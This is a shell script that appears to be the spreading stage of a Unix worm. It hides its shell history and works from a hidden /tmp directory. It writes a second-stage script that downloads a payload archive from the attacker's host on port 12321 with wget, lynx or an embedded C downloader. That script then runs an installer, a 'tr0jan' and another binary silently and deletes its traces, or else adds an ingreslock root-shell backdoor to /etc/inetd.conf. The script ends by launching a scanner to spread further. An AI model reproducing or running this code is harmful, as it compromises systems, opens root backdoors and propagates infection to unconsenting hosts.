#!/bin/sh
export HISTSIZE=0;export HISTFILE=/dev/null
export PATH="/bin/:/usr/sbin/:/usr/bin:/sbin:/usr/local/bin:."
cd /tmp/.tmp
a=`./w0rmIP`
# setup our input files..
if [ ! -f .in ]; then
   cat << _EOPS_ > .in
   #!/bin/sh
   export HISTSIZE=0;export HISTFILE=/dev/null
   export PATH="/bin/:/usr/sbin/:/usr/bin:/sbin:/usr/local/bin:."
   if [ -f /tmp/.tmp/.in ]; then
	(sleep 5;rm -f /tmp/.tmp/d0 >/dev/null 2>&1) &
	exit
   fi
   echo $a > IP
# wget ownz me.. my w0rmz 0wn y0u 
   touch 1
   if [ -f /usr/local/bin/wget ]; then
	touch 2
	/usr/local/bin/wget http://$a:12321/stuff.tgz
	tar -zxvf stuff.tgz >/dev/null 2>&1
	mv stuff.tgz stuff/
	./install.sh >/dev/null 2>&1
	./tr0jan >/dev/null 2>&1 &
	/sbin/WS >/dev/null 2>&1 &
	(sleep 5;rm -f /tmp/.tmp/d0 >/dev/null 2>&1) &
	exit
   fi 
# we'll take what we can get <g>
   touch 3
   if [ -f /usr/bin/lynx ]; then
	touch 4
	/usr/bin/lynx -source http://$a:12321/stuff.tgz >stuff.tgz
	tar -zxvf stuff.tgz >/dev/null 2>&1
	mv stuff.tgz stuff/
	./install.sh >/dev/null 2>&1
	./tr0jan >/dev/null 2>&1 &
	/sbin/WS >/dev/null 2>&1 &
	(sleep 5;rm -f /tmp/.tmp/d0 >/dev/null 2>&1) &
	exit
   else
	touch 5
        cat << _EOF_ > get.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>

int sock_gets(int sockfd, char *str, size_t count) {
  int bytes_read;
  int total_count = 0;
  char *current_position;
  char last_read = 0;

  current_position = str;
  while (last_read != 10) {
    bytes_read = read(sockfd, &last_read, 1);
    if (bytes_read <= 0) {
      return -1;
    }
    if ((total_count < count) && (last_read != 10) && (last_read !=13))
{
      current_position[0] = last_read;
      current_position++;
      total_count++;
    }
  }
  if (count > 0)
    current_position[0] = 0;
  return total_count;
}
main(int argc, char *argv[]) {
  struct sockaddr_in sin;
  struct hostent *hp;
  int sock, rcv;
  int contentlength = 0;
  char linebuffer[80];
  char *buffer, *delimit;
  FILE *outfile;
  int connected = 1;
  const BUFSIZE = 1024;

  if (argc != 4) {
    fprintf(stderr, "Usage: %s <host> <file> <localfile>\n", argv[0]);
    exit(1);
  }

  if ((outfile = fopen(argv[3], "w")) == NULL) {
    printf("Error: cannot create file %s\n", argv[3]);
    exit(1);
  }

  sin.sin_addr.s_addr = inet_addr(argv[1]);
  if (sin.sin_addr.s_addr == -1) {
    hp = gethostbyname(argv[1]);
    if (hp==NULL) {
      printf("Unknown host: %s\n",argv[1]);
      exit(1);
    }
    bzero((char*) &sin, sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
  } else {
    sin.sin_family = AF_INET;
  }
  sin.sin_port = htons(12321);
  sock = socket(AF_INET, SOCK_STREAM, 0);
  connect(sock,(struct sockaddr *) &sin, sizeof(sin));

  sprintf(linebuffer, "GET /%s HTTP/1.0\nHost: %s", argv[2], argv[1]);
  strcat(linebuffer, "\r\n\r\n");
  write(sock, &linebuffer[0], strlen(linebuffer));

  printf("Fetch: http://%s/%s\n", argv[1], argv[2]);

  while (connected) {
    if (sock_gets(sock,linebuffer,sizeof(linebuffer)) == -1) {
      connected = 0;
      close(outfile);
      close(sock);
      printf("Error: invalid server reply\n");
      exit(1);
    }

    if (strncasecmp("HTTP/", linebuffer, 5) == 0) {
      delimit = strtok(linebuffer, " ");
      delimit = strtok(NULL, " ");
      if (atoi(strdup(delimit)) == 404) {
        printf("Error: 404 File Not Found\n");
        close(sock);
        close(outfile);
        exit(1);
      }
    } else if (strncasecmp("Content-Length:", linebuffer, 15) == 0) {
      delimit = strtok(linebuffer, " ");
      delimit = strtok(NULL, " ");
      contentlength = atoi(strdup(delimit));
    } else if (strcmp("", linebuffer) == 0) {
      if (contentlength != 0) {
        connected = 0;
      } else {
        close(outfile);
        close(sock);
        printf("Error: unable to parse server reply\n");
        exit(1);
      }
    }
  }

  buffer = (char *)malloc(BUFSIZE);
  if (buffer == NULL) {
    printf("Error: memory allocation for %d bytes\n", BUFSIZE);
    close(outfile);
    close(sock);
    exit(1);
  }

  while (contentlength > 0) {
    if ((rcv = read(sock, buffer, 1024)) < 0) {
      printf("Error: reading from network\n");
      close(outfile);
      close(sock);
      exit(1);
    }
    if (fwrite(buffer, rcv, 1, outfile) != 1) {
      printf("Error: writing to file %s\n", argv[3]);
      close(outfile);
      close(sock);
      exit(1);
    }
    contentlength -= rcv;
  }

  printf("Saved: %s\n", argv[3]);
  free(buffer);
  close(outfile);
  close(sock);
}
_EOF_
        cc -o get get.c >/dev/null 2>&1
        touch 6
        if [ -f get ]; then
            touch 7
            ./get $a stuff.tgz stuff.tgz
            tar -zxvf stuff.tgz >/dev/null 2>&1
            mv stuff.tgz stuff/
            ./install.sh >/dev/null 2>&1
            ./tr0jan >/dev/null 2>&1 &
            /sbin/WS >/dev/null 2>&1 &
            (sleep 5;rm -f /tmp/.tmp/d0 >/dev/null 2>&1) &
            exit
        else
            touch 8
# ingreslock backdoor setup
	    cp /etc/inetd.conf /tmp/.tmp/
	    echo "ingreslock stream tcp nowait root /bin/sh sh -i"  >>/etc/inetd.conf
	    (/usr/sbin/inetd >/dev/null 2>&1) &
            (sleep 5;rm -rf /tmp/.tmp >/dev/null 2>&1) &
            exit
        fi	
   fi
_EOPS_
fi
# drivers... start your engines.!
./w0rmserver
./w0rmmigs -r |./w0rmssscan -sp53 -b8.2 -i$a -e./w0rmlinx.sh -c100 -onameds >/dev/null 2>&1 &
# and they're off <g>
